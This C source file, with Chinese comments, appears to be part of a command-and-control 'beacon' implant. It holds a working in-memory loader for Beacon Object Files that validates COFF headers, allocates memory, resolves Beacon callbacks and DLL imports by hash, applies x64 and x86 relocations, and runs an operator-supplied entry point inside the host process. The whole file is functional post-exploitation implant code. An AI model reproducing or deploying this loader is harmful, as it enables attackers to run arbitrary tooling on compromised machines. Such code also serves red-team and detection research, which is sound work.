#include "beacon_bof_internal.h"

/* 验证 COFF 文件头的完整性和合法性 */
static BOOL BofValidateCoff(PCOFFEE pCoffee, DWORD dwBofSize, PCHAR reason, SIZE_T reasonSize)
{
    SIZE_T sectionTableEnd;
    SIZE_T symbolTableEnd;

    if (!pCoffee || !pCoffee->Header || dwBofSize < sizeof(COFF_FILE_HEADER)) {
        snprintf(reason, reasonSize, "file too small");
        return FALSE;
    }

    sectionTableEnd = sizeof(COFF_FILE_HEADER) +
        ((SIZE_T)pCoffee->Header->NumberOfSections * sizeof(COFF_SECTION));
    if (pCoffee->Header->NumberOfSections == 0 || sectionTableEnd > dwBofSize) {
        snprintf(reason, reasonSize, "invalid section table");
        return FALSE;
    }

    if (pCoffee->Header->PointerToSymbolTable >= dwBofSize) {
        snprintf(reason, reasonSize, "invalid symbol table offset");
        return FALSE;
    }

    symbolTableEnd = (SIZE_T)pCoffee->Header->PointerToSymbolTable +
        ((SIZE_T)pCoffee->Header->NumberOfSymbols * sizeof(COFF_SYMBOL));
    if (symbolTableEnd > dwBofSize) {
        snprintf(reason, reasonSize, "invalid symbol table size");
        return FALSE;
    }

    return TRUE;
}

/* 分配 BOF 映射内存 */
static PVOID BofAllocateImageMemory(BeaconContext* ctx, DWORD dwSize)
{
    PVOID buffer = NULL;
    SIZE_T size = dwSize;

    if (!ctx || dwSize == 0 || !ctx->api.pfnNtAllocateVirtualMemory) {
        return NULL;
    }

    if (ctx->api.pfnNtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_READWRITE) == 0) {
        return buffer;
    }

    return NULL;
}

/*
 * 遍历所有节区和重定位条目，计算：
 * - 所有节区的原始数据总大小（页对齐）
 * - GOT 表大小（外部函数跳转表）
 * - BSS 段大小（未初始化全局变量）
 */
static SIZE_T BofParseTotalSize(BofJobRuntime* runtime, PCOFFEE pCoffee,
                                SIZE_T* stTotalSize, PSIZE_T pstBSSSize)
{
    CHAR sym_name[9] = { 0 };
    PCHAR symbol_name = NULL;
    DWORD number_of_func = 0;
    PCOFF_SYMBOL coff_symbol = NULL;
    DWORD sec, r;

    *stTotalSize = 0;
    *pstBSSSize = 0;
    runtime->bss_entry_count = 0;
    runtime->bss_entry_capacity = 0;

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; sec++) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Data +
            pCoffee->Section->PointerToRelocations);

        *stTotalSize += pCoffee->Section->SizeOfRawData;
        *stTotalSize = (SIZE_T)PAGE_ALLIGN(*stTotalSize);

        for (r = 0; r < pCoffee->Section->NumberOfRelocations; r++) {
            coff_symbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

            if (coff_symbol->First.Value[0] != 0) {
                memset(sym_name, 0, sizeof(sym_name));
                memcpy(sym_name, coff_symbol->First.Name, 8);
                symbol_name = sym_name;
            } else {
                symbol_name = (PCHAR)((ULONG_PTR)(pCoffee->Symbol +
                    pCoffee->Header->NumberOfSymbols) + coff_symbol->First.Value[1]);
            }

            if (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                coff_symbol->SectionNumber == 0x0) {
                if (BofHashString(symbol_name, COFF_PREP_SYMBOL_SIZE, FALSE) == COFF_PREP_SYMBOL)
                    number_of_func++;
                else {
                    *pstBSSSize += coff_symbol->Value;
                    runtime->bss_entry_count++;
                }
            }

            pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
        }
    }

    *stTotalSize += sizeof(PVOID) * number_of_func;
    *stTotalSize += *pstBSSSize;
    *stTotalSize += 0x4;
    runtime->bss_entry_capacity = runtime->bss_entry_count;

    return sizeof(PVOID) * number_of_func;
}

/*
 * 解析单个 COFF 符号，返回其内存地址：
 * 1. __imp_BeaconXxx -> Beacon API 回调
 * 2. __imp_Lib$Func -> DLL 导入函数
 * 3. 无前缀 -> BSS 段变量
 */
static BOOL BofProcessSymbol(BofJobRuntime* runtime, PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,
                             PVOID* pvFunctionAddr, PDWORD pdwBssAddr)
{
    CHAR symbol_name[1024] = { 0 };
    CHAR import_name[1024] = { 0 };
    CHAR normalized_symbol[1024] = { 0 };
    CHAR normalized_library[1024] = { 0 };
    CHAR* libraryName = NULL;
    CHAR* functionName = NULL;
    CHAR* symbolName = NULL;
    DWORD import_prefix_size = 0;
    DWORD beacon_prefix_size = 0;

    import_prefix_size = BofGetImportPrefixSize(pSymbolName);
    beacon_prefix_size = BofGetBeaconPrefixSize(pSymbolName);

    if (beacon_prefix_size != 0) {
        symbolName = pSymbolName + import_prefix_size;
        symbolName = BofSkipImportThunkPrefix(symbolName);

        if (!BofCopyString(normalized_symbol, sizeof(normalized_symbol), symbolName)) {
            BofSetError(runtime, "Beacon API symbol name too long: %s", pSymbolName);
            return FALSE;
        }
        BofStripStdcallSuffix(normalized_symbol);

        for (DWORD i = 0; ; i++) {
            extern COFFAPIFUNC BeaconApi[];
            if (!BeaconApi[i].NameHash) break;
            if (BofHashString(normalized_symbol, (ULONG)BofStrLen(normalized_symbol), FALSE) ==
                BeaconApi[i].NameHash) {
                *pvFunctionAddr = BeaconApi[i].Pointer;
                return TRUE;
            }
        }

        BofSetError(runtime, "failed to resolve Beacon API symbol: %s", normalized_symbol);
        return FALSE;
    }

    if (import_prefix_size != 0) {
        DWORD i;

        if (!BofCopyString(import_name, sizeof(import_name), pSymbolName)) {
            BofSetError(runtime, "import symbol name too long");
            return FALSE;
        }

        for (i = 0; i < (DWORD)BofStrLen(pSymbolName); i++) {
            if (pSymbolName[i] == '$') break;
        }

        symbolName = import_name + import_prefix_size;
        symbolName = BofSkipImportThunkPrefix(symbolName);

        if (i < (DWORD)BofStrLen(pSymbolName)) {
            libraryName = BofStrToken(symbolName, "$");
            functionName = libraryName + BofStrLen(libraryName) + 1;
            libraryName = BofSkipImportThunkPrefix(libraryName);

            if (!BofCopyString(normalized_library, sizeof(normalized_library), libraryName) ||
                !BofCopyString(symbol_name, sizeof(symbol_name), functionName)) {
                BofSetError(runtime, "import symbol component too long: %s", pSymbolName);
                return FALSE;
            }
            BofStripStdcallSuffix(symbol_name);

            if (BofResolveDllProc(runtime, normalized_library, symbol_name, pvFunctionAddr)) {
                return TRUE;
            }
            BofSetError(runtime, "failed to resolve import: %s$%s", normalized_library, symbol_name);
            return FALSE;
        }

        if (!BofCopyString(symbol_name, sizeof(symbol_name), symbolName)) {
            BofSetError(runtime, "import symbol name too long: %s", pSymbolName);
            return FALSE;
        }
        BofStripStdcallSuffix(symbol_name);

        for (i = 0; ; i++) {
            if (!runtime->ldr_api[i].NameHash) break;
            if (BofHashString(symbol_name, (ULONG)BofStrLen(symbol_name), FALSE) ==
                runtime->ldr_api[i].NameHash) {
                *pvFunctionAddr = runtime->ldr_api[i].Pointer;
                return TRUE;
            }
        }

        if (BofResolveCommonProc(runtime, symbol_name, pvFunctionAddr)) {
            return TRUE;
        }

        BofSetError(runtime, "failed to resolve import: %s", symbol_name);
        return FALSE;
    }

    if (import_prefix_size == 0 && beacon_prefix_size == 0) {
        DWORD sum = 0;

        for (DWORD i = 0; i < runtime->bss_entry_capacity; i++) {
            if (runtime->bss_entries[i].pvSymbolAddr == (PVOID)pCoffSymbol) {
                break;
            } else if (runtime->bss_entries[i].pvSymbolAddr == NULL &&
                       runtime->bss_entries[i].stOffset == 0) {
                runtime->bss_entries[i].stOffset = pCoffSymbol->Value;
                runtime->bss_entries[i].pvSymbolAddr = (PVOID)pCoffSymbol;
                break;
            } else {
                sum += (DWORD)runtime->bss_entries[i].stOffset;
            }
        }

        *pdwBssAddr = (ULONG_PTR)*pdwBssAddr + sum + 0x4;
        return TRUE;
    }

    return FALSE;
}

/*
 * 处理所有节区的重定位条目。
 * 支持 x64: REL32, REL32_1~5, ADDR32NB, ADDR64
 * 支持 x86: REL32, DIR32, DIR32NB, SECTION, SECREL
 */
static BOOL BofProcessSection(BeaconContext* ctx, BofJobRuntime* runtime, PCOFFEE pCoffee)
{
    CHAR sym_name[9] = { 0 };
    PCHAR symbol_name = NULL;
    PVOID function_ptr = NULL;
    DWORD number_of_func = 0;
    PVOID reloc_addr = NULL;
    PVOID func_map_addr = NULL;
    PVOID symbol_sec_addr = NULL;
    ULONG_PTR bss_addr = 0;
    PCOFF_SYMBOL coff_symbol = NULL;
    DWORD sec, r;
    (VOID)ctx;

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; sec++) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Data +
            pCoffee->Section->PointerToRelocations);

        for (r = 0; r < pCoffee->Section->NumberOfRelocations; r++) {
            DWORD bss_entry_offset = 0;

            function_ptr    = NULL;
            symbol_sec_addr = NULL;
            bss_addr        = 0;

            coff_symbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

            if (coff_symbol->First.Value[0] != 0) {
                memset(sym_name, 0, sizeof(sym_name));
                memcpy(sym_name, coff_symbol->First.Name, 8);
                symbol_name = sym_name;
            } else {
                symbol_name = (PCHAR)((ULONG_PTR)pCoffee->Symbol +
                    pCoffee->Header->NumberOfSymbols * 0x12 +
                    (ULONG_PTR)coff_symbol->First.Value[1]);
            }

            reloc_addr    = pCoffee->SecMap[sec].Ptr + pCoffee->Reloc->VirtualAddress;
            func_map_addr = &pCoffee->GOT[number_of_func];

            if (coff_symbol->SectionNumber > 0 &&
                coff_symbol->SectionNumber <= pCoffee->Header->NumberOfSections) {
                symbol_sec_addr = pCoffee->SecMap[coff_symbol->SectionNumber - 1].Ptr;
            }

            if ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) &&
                coff_symbol->SectionNumber == 0x0) {
                if (!BofProcessSymbol(runtime, symbol_name, coff_symbol, &function_ptr, &bss_entry_offset))
                    return FALSE;
                if (!function_ptr && bss_entry_offset)
                    bss_addr = (ULONG_PTR)pCoffee->BSS + bss_entry_offset;
            }

#if _WIN64
            {
                UINT64 OffsetLong = 0;
                UINT32 Offset = 0;

                if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && function_ptr != NULL) {
                    pCoffee->GOT[number_of_func] = (ULONG_PTR)function_ptr;
                    Offset = (UINT32)((ULONG_PTR)(&pCoffee->GOT[number_of_func]) -
                        (ULONG_PTR)(reloc_addr) - sizeof(UINT32));
                    *((PUINT32)reloc_addr) = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type >= IMAGE_REL_AMD64_REL32 &&
                           pCoffee->Reloc->Type <= IMAGE_REL_AMD64_REL32_5) {
                    if (bss_addr != 0) {
                        Offset = (UINT32)(bss_addr -
                            (ULONG_PTR)(pCoffee->Reloc->Type - 4) -
                            ((ULONG_PTR)reloc_addr + 4));
                    } else if ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                                coff_symbol->Value != 0) ||
                               (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                                coff_symbol->SectionNumber != 0x0)) {
                        Offset = (UINT32)((ULONG_PTR)coff_symbol->Value +
                            (ULONG_PTR)(symbol_sec_addr) - (ULONG_PTR)(reloc_addr) -
                            sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4));
                    } else {
                        Offset = (UINT32)((ULONG_PTR)*(PUINT32)(reloc_addr) +
                            (ULONG_PTR)(symbol_sec_addr) - (ULONG_PTR)(reloc_addr) -
                            sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4));
                    }
                    *((PUINT32)reloc_addr) = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                    if (bss_addr != 0) {
                        Offset = (UINT32)(bss_addr + *(PUINT32)reloc_addr -
                            (ULONG_PTR)pCoffee->ImageBase);
                    } else if (symbol_sec_addr != NULL) {
                        Offset = (UINT32)((ULONG_PTR)symbol_sec_addr +
                            (ULONG_PTR)coff_symbol->Value + *(PUINT32)reloc_addr -
                            (ULONG_PTR)pCoffee->ImageBase);
                    } else {
                        Offset = *(PUINT32)reloc_addr;
                    }
                    *((PUINT32)reloc_addr) = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                    if (bss_addr != 0) {
                        OffsetLong = bss_addr + *(PUINT64)reloc_addr;
                    } else if (symbol_sec_addr != NULL) {
                        OffsetLong = (ULONG_PTR)symbol_sec_addr +
                            (ULONG_PTR)coff_symbol->Value + *(PUINT64)reloc_addr;
                    } else {
                        OffsetLong = *(PUINT64)reloc_addr;
                    }
                    *((PUINT64)reloc_addr) = OffsetLong;
                }
            }
#else
            {
                UINT32 Addend = *(PUINT32)reloc_addr;
                UINT32 Offset = 0;

                if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 && function_ptr != NULL) {
                    Offset = (UINT32)((ULONG_PTR)function_ptr -
                        ((ULONG_PTR)reloc_addr + sizeof(UINT32)));
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 && bss_addr != 0) {
                    Offset = (UINT32)(bss_addr + Addend - (ULONG_PTR)reloc_addr - sizeof(UINT32));
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    Offset = Addend + coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)reloc_addr - sizeof(UINT32);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_REL32 &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)reloc_addr - sizeof(UINT32);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 && function_ptr != NULL) {
                    *(PVOID*)func_map_addr = function_ptr;
                    Offset = (UINT32)(ULONG_PTR)func_map_addr;
                    *(PUINT32)reloc_addr = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 && bss_addr != 0) {
                    Offset = (UINT32)(bss_addr + Addend);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    Offset = Addend + coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32 &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB && function_ptr != NULL) {
                    *(PVOID*)func_map_addr = function_ptr;
                    Offset = (UINT32)((ULONG_PTR)func_map_addr - (ULONG_PTR)pCoffee->ImageBase);
                    *(PUINT32)reloc_addr = Offset;
                    number_of_func++;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB && bss_addr != 0) {
                    Offset = (UINT32)(bss_addr + Addend - (ULONG_PTR)pCoffee->ImageBase);
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB &&
                           ((coff_symbol->StorageClass == IMAGE_SYM_CLASS_STATIC &&
                             coff_symbol->Value != 0) ||
                            (coff_symbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                             coff_symbol->SectionNumber != 0x0))) {
                    Offset = Addend + coff_symbol->Value;
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)pCoffee->ImageBase;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_DIR32NB &&
                           function_ptr == NULL && symbol_sec_addr != NULL) {
                    Offset = *(PUINT32)(reloc_addr);
                    Offset += (ULONG_PTR)symbol_sec_addr - (ULONG_PTR)pCoffee->ImageBase;
                    *(PUINT32)reloc_addr = Offset;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_SECTION &&
                           symbol_sec_addr != NULL) {
                    *(PUINT16)reloc_addr = coff_symbol->SectionNumber;

                } else if (pCoffee->Reloc->Type == IMAGE_REL_I386_SECREL &&
                           symbol_sec_addr != NULL) {
                    *(PUINT32)reloc_addr = coff_symbol->Value;

                } else if (pCoffee->Reloc->Type != IMAGE_REL_I386_ABSOLUTE) {
                    return FALSE;
                }
            }
#endif
            pCoffee->Reloc = (PCOFF_RELOC)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
        }
    }

    return TRUE;
}

#if _WIN64
static BOOL BofRegisterFunctionTable(BeaconContext* ctx, PCOFFEE pCoffee,
                                     PRUNTIME_FUNCTION* functionTable)
{
    HMODULE ntdll;
    BofRtlAddFunctionTable addFunctionTable;
    DWORD sec;
    DWORD count;

    if (functionTable) {
        *functionTable = NULL;
    }
    if (!ctx || !pCoffee || !functionTable ||
        !ctx->api.pfnGetModuleHandleA || !ctx->api.pfnGetProcAddress) {
        return TRUE;
    }

    for (sec = 0; sec < pCoffee->Header->NumberOfSections; ++sec) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        if (memcmp(pCoffee->Section->Name, ".pdata", 6) == 0 &&
            pCoffee->SecMap[sec].Size >= sizeof(RUNTIME_FUNCTION)) {
            ntdll = (HMODULE)ctx->api.pfnGetModuleHandleA("ntdll.dll");
            if (!ntdll) {
                return FALSE;
            }

            addFunctionTable = (BofRtlAddFunctionTable)
                ctx->api.pfnGetProcAddress(ntdll, "RtlAddFunctionTable");
            if (!addFunctionTable) {
                return FALSE;
            }

            count = (DWORD)(pCoffee->SecMap[sec].Size / sizeof(RUNTIME_FUNCTION));
            if (!addFunctionTable((PRUNTIME_FUNCTION)pCoffee->SecMap[sec].Ptr,
                                  count,
                                  (DWORD64)pCoffee->ImageBase)) {
                return FALSE;
            }

            *functionTable = (PRUNTIME_FUNCTION)pCoffee->SecMap[sec].Ptr;
            return TRUE;
        }
    }

    return TRUE;
}

static VOID BofUnregisterFunctionTable(BeaconContext* ctx, PRUNTIME_FUNCTION functionTable)
{
    HMODULE ntdll;
    BofRtlDeleteFunctionTable deleteFunctionTable;

    if (!ctx || !functionTable ||
        !ctx->api.pfnGetModuleHandleA || !ctx->api.pfnGetProcAddress) {
        return;
    }

    ntdll = (HMODULE)ctx->api.pfnGetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        return;
    }

    deleteFunctionTable = (BofRtlDeleteFunctionTable)
        ctx->api.pfnGetProcAddress(ntdll, "RtlDeleteFunctionTable");
    if (deleteFunctionTable) {
        deleteFunctionTable(functionTable);
    }
}
#endif

BOOL BofLoadAndRun(BeaconContext* ctx, BofJobRuntime* runtime,
                   PVOID bofBuffer, DWORD bofSize,
                   PVOID argsBuffer, DWORD argsSize,
                   PCHAR entryName)
{
    PVOID next_base = NULL;
    PCOFFEE coffee = NULL;
    DWORD sec;
    CHAR validateReason[64] = { 0 };
    BOOL ok = FALSE;
#if _WIN64
    PRUNTIME_FUNCTION functionTable = NULL;
#endif

    if (!ctx || !runtime || !bofBuffer || bofSize == 0 || !entryName) {
        BofSetError(runtime, "invalid loader parameters");
        return FALSE;
    }

    coffee = (PCOFFEE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COFFEE));
    if (!coffee) {
        BofSetError(runtime, "failed to allocate COFFEE");
        return FALSE;
    }

    coffee->Data   = bofBuffer;
    coffee->Header = (PCOFF_FILE_HEADER)coffee->Data;

    if (!BofValidateCoff(coffee, bofSize, validateReason, sizeof(validateReason))) {
        BofSetError(runtime, "invalid COFF: %s", validateReason);
        goto cleanup;
    }

    coffee->Symbol = (PCOFF_SYMBOL)((ULONG_PTR)coffee->Data +
        coffee->Header->PointerToSymbolTable);
    coffee->SecMap = (PSECTION_MAP)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
        coffee->Header->NumberOfSections * sizeof(SECTION_MAP));
    if (!coffee->SecMap) {
        BofSetError(runtime, "failed to allocate section map");
        goto cleanup;
    }

#ifdef _WIN64
    if (coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
        BofSetError(runtime, "architecture mismatch, x64 beacon requires AMD64 COFF, got 0x%04X",
                    coffee->Header->Machine);
        goto cleanup;
    }
#else
    if (coffee->Header->Machine != IMAGE_FILE_MACHINE_I386) {
        BofSetError(runtime, "architecture mismatch, x86 beacon requires I386 COFF, got 0x%04X",
                    coffee->Header->Machine);
        goto cleanup;
    }
#endif

    coffee->GOTSize = BofParseTotalSize(runtime, coffee, &coffee->BofSize, &coffee->BSSSize);

    coffee->ImageBase = BofAllocateImageMemory(ctx, (DWORD)coffee->BofSize);
    if (!coffee->ImageBase) {
        BofSetError(runtime, "failed to allocate memory");
        goto cleanup;
    }

    next_base = coffee->ImageBase;
    for (sec = 0; sec < coffee->Header->NumberOfSections; sec++) {
        coffee->Section = (PCOFF_SECTION)((ULONG_PTR)coffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * sec));
        coffee->SecMap[sec].Size = coffee->Section->SizeOfRawData;
        coffee->SecMap[sec].Ptr  = (PCHAR)next_base;

        next_base = (PVOID)((ULONG_PTR)next_base + coffee->Section->SizeOfRawData);
        next_base = (PVOID)PAGE_ALLIGN(next_base);

        if (coffee->Section->PointerToRawData != 0 &&
            !(coffee->Section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)) {
            memcpy(coffee->SecMap[sec].Ptr,
                   (PVOID)((ULONG_PTR)coffee->Data + coffee->Section->PointerToRawData),
                   coffee->Section->SizeOfRawData);
        }
    }

    coffee->GOT = (PULONG_PTR)next_base;
    coffee->BSS = (PVOID)((ULONG_PTR)next_base + coffee->GOTSize);

    if (runtime->bss_entry_capacity) {
        runtime->bss_entries = (BSSEntry*)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY,
            (SIZE_T)runtime->bss_entry_capacity * sizeof(BSSEntry));
        if (!runtime->bss_entries) {
            BofSetError(runtime, "failed to allocate BSS entry table");
            goto cleanup;
        }
    }

    if (!BofProcessSection(ctx, runtime, coffee)) {
        if (runtime->last_error[0]) {
            CHAR detail[sizeof(runtime->last_error)];
            memcpy(detail, runtime->last_error, sizeof(detail));
            detail[sizeof(detail) - 1] = '\0';
            BofSetError(runtime, "relocation processing failed: %s", detail);
        } else {
            BofSetError(runtime, "relocation processing failed");
        }
        goto cleanup;
    }

#if _WIN64
    if (!BofRegisterFunctionTable(ctx, coffee, &functionTable)) {
        BofSetError(runtime, "failed to register x64 function table");
        goto cleanup;
    }
#endif

    if (JobIsCancelRequested(runtime->job)) {
        BofSetError(runtime, "canceled before entry");
        goto cleanup;
    }

    BofRuntimeRegister(runtime, coffee->ImageBase, coffee->BofSize);
    if (!BofRun(ctx, runtime, coffee, entryName, argsBuffer, argsSize)) {
        if (runtime->last_error[0]) {
            CHAR detail[sizeof(runtime->last_error)];
            memcpy(detail, runtime->last_error, sizeof(detail));
            detail[sizeof(detail) - 1] = '\0';
            BofSetError(runtime, "execution failed: %s", detail);
        } else {
            BofSetError(runtime, "execution failed");
        }
        goto cleanup;
    }

    ok = TRUE;

cleanup:
    BofRuntimeUnregister(runtime);
#if _WIN64
    if (functionTable) {
        BofUnregisterFunctionTable(ctx, functionTable);
    }
#endif
    if (coffee) {
        if (coffee->ImageBase)
            ctx->api.pfnVirtualFree(coffee->ImageBase, 0, MEM_RELEASE);
        if (coffee->SecMap)
            BOFSECUREFREE(coffee->SecMap, coffee->Header->NumberOfSections * sizeof(SECTION_MAP));
        BOFSECUREFREE(coffee, sizeof(COFFEE));
    }

    return ok;
}
